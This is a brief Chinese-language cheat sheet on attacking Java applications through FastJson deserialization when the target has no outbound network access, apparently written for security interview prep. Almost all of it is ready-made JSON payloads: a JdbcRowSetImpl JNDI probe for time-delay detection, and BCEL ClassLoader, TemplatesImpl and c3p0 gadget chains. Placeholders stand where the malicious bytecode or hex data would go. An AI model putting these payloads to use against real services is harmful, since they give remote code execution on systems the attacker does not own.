# JAVA攻防-FastJson专题&面试不出网利用&BCEL字节码&C3P0二次&Impl链&延时判断

```JAVA
#FastJson不出网利用：
参考：https://xz.aliyun.com/news/11938
参考：https://github.com/safe6Sec/Fastjson

0、延时判断
利用加载本地不存在的JNDI测试延时判断
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:1099/badClassName", "autoCommit":true}
{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:8088/badClassName", "autoCommit":true}}""}

1、BCEL-Tomcat&Spring链
利用Java的BCEL字节码进行绕过，字节码，就是Java源代码编译后的产物，它是一种中间代码，既不是完全的机器语言，也不是咱们写的那些高级语言代码。JVM（Java虚拟机）就是通过解释或编译这些字节码来运行咱们的程序。而BCEL字节码检测器是一个Java字节码操作库,可以用于分析、修改和创建Java类文件的字节码.
gadget链：
{
   "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
   "driverClassLoader": {
        "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
   },
   "driverClassName": "$$BCEL$$xxxx"
}
	
2、TemplatesImpl链
条件：JSON.parseObject(payload, Feature.SupportNonPublicField);
{
    "@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    "_bytecodes": ["字节码"],
    '_name': 'a.b',
    '_tfactory': {},
    "_outputProperties": {},
    "_name": "b",
    "_version": "1.0",
    "allowedProtocols": "all"
}

3、c3p0链
条件：依赖包
{
    "@type": "java.lang.Class",
    "val": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"
},
"f": {
    "@type": "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
    "userOverridesAsString": "HexAsciiSerializedMap:;HEX值"
}

```

